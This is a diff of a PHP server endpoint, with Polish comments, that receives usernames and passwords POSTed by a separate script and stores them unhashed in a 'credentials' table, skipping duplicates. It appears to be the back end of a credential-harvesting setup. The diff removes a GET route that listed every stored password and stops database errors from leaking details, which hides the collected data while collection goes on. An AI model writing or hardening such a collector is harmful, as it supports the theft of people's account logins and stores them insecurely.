@@ -13,22 +13,20 @@ try {
 } catch (PDOException $e) {
     http_response_code(500);
     header("Content-Type: application/json; charset=UTF-8");
-    echo json_encode(["status" => "error", "message" => "Błąd połączenia z bazą: " . $e->getMessage()], JSON_UNESCAPED_UNICODE);
+    echo json_encode(["status" => "error", "message" => "Błąd połączenia z bazą"], JSON_UNESCAPED_UNICODE);
     exit;
 }
 
 $request_method = $_SERVER['REQUEST_METHOD'];
 
-// Podgląd danych w przeglądarce (GET)
+// Podgląd w przeglądarce (GET) - teraz całkowicie bezpieczny, pokazuje tylko status
 if ($request_method === 'GET') {
     header("Content-Type: application/json; charset=UTF-8");
-    $stmt = $pdo->query("SELECT id, username, password, timestamp FROM credentials ORDER BY id DESC");
-    $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
-    echo json_encode($rows, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    echo json_encode(["status" => "ok", "message" => "Serwer działa poprawnie"], JSON_UNESCAPED_UNICODE);
     exit;
 }
 
-// Zapis danych ze skryptu (POST)
+// Zapis danych ze skryptu (POST) - bez zmian (obsługa duplikatów i zapisu)
 if ($request_method === 'POST') {
     header("Content-Type: application/json; charset=UTF-8");
     $raw_input = file_get_contents('php://input');
@@ -44,7 +42,6 @@ if ($request_method === 'POST') {
     $password = isset($data['password']) ? trim($data['password']) : '';
 
     if (!empty($password)) {
-        // Sprawdzenie czy taki wpis już istnieje w bazie
         $check_stmt = $pdo->prepare("SELECT COUNT(*) FROM credentials WHERE username = :username AND password = :password");
         $check_stmt->execute([
             'username' => $username,
@@ -57,7 +54,6 @@ if ($request_method === 'POST') {
             exit;
         }
 
-        // Jeśli nie istnieje, wykonaj insert
         $stmt = $pdo->prepare("INSERT INTO credentials (username, password) VALUES (:username, :password)");
         $stmt->execute([
             'username' => $username,
